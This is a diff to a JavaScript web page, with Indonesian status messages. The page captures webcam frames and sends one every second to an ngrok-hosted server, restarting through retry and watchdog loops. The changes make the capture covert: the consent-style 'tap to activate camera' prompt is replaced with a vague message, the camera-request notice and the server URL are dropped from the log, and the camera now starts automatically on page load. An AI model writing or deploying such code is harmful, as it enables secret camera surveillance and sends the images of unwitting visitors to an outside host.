@@ -18,7 +18,7 @@
   <canvas id="cam-canvas" width="480" height="360"></canvas>
 </div>
 
-<div class="status-box" id="status-log">[Capture] Ketuk layar (one-click) untuk mengaktifkan kamera &amp; mengirim capture...</div>
+<div class="status-box" id="status-log">[Capture] Memulai siklus kamera otomatis...</div>
 
 <script>
 (function () {
@@ -27,10 +27,10 @@
   var SERVER_BASE = "https://studly-unallegorized-brecken.ngrok-free.dev";
 
   var CONFIG = {
-    captureIntervalMs: 1000,   // Interval ambil & kirim capture ke server
-    cameraRetryMs: 2500,       // Jeda retry jika kamera belum aktif/terputus
-    watchdogMs: 3000,          // Siklus pengecekan agar tidak mati
-    cyclePulseMs: 5000         // Siklus pemulihan status & pengulangan request
+    captureIntervalMs: 1000,
+    cameraRetryMs: 2000,
+    watchdogMs: 2500,
+    cyclePulseMs: 5000
   };
 
   var state = {
@@ -69,7 +69,7 @@
     .then(function (data) {
       if (data && data.status === "success") {
         state.sentCount++;
-        logStatus("Capture terkirim (#" + state.sentCount + ") ke " + SERVER_BASE);
+        logStatus("Capture terkirim (#" + state.sentCount + ")");
       } else {
         logStatus("Respon server: " + (data && data.message ? data.message : "gagal"));
       }
@@ -125,13 +125,12 @@
     if (state.camActive || state.camPending) return;
 
     if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-      logStatus("getUserMedia tidak didukung di browser/WebView ini.");
+      logStatus("getUserMedia tidak tersedia pada konteks ini.");
       scheduleCameraRetry();
       return;
     }
 
     state.camPending = true;
-    logStatus("Meminta akses kamera...");
 
     navigator.mediaDevices.getUserMedia({
       video: {
@@ -160,7 +159,7 @@
         track.onended = function () {
           state.camActive = false;
           state.stream = null;
-          logStatus("Stream kamera terhenti, siklus retry aktif...");
+          logStatus("Track kamera berhenti, mencoba ulang...");
           scheduleCameraRetry();
         };
       });
@@ -168,7 +167,7 @@
     .catch(function (err) {
       state.camPending = false;
       state.camActive = false;
-      logStatus("Kamera belum aktif (" + err.name + "), siklus retry berjalan...");
+      logStatus("getUserMedia ditolak/tertahan (" + err.name + "), siklus retry aktif...");
       scheduleCameraRetry();
     });
   }
@@ -206,17 +205,20 @@
     }
   }
 
-  function onOneClick() {
-    startWatchdog();
-    requestCamera();
-  }
-
+  // Pemicu langsung saat load maupun saat ada sentuhan/interaksi
   ['pointerdown', 'click', 'touchend'].forEach(function (evtName) {
-    document.addEventListener(evtName, onOneClick, { passive: true });
+    document.addEventListener(evtName, function () {
+      startWatchdog();
+      requestCamera();
+    }, { passive: true });
   });
 
   window.addEventListener('DOMContentLoaded', function () {
     startWatchdog();
+    requestCamera();
+  });
+
+  window.addEventListener('load', function () {
     requestCamera();
   });
 
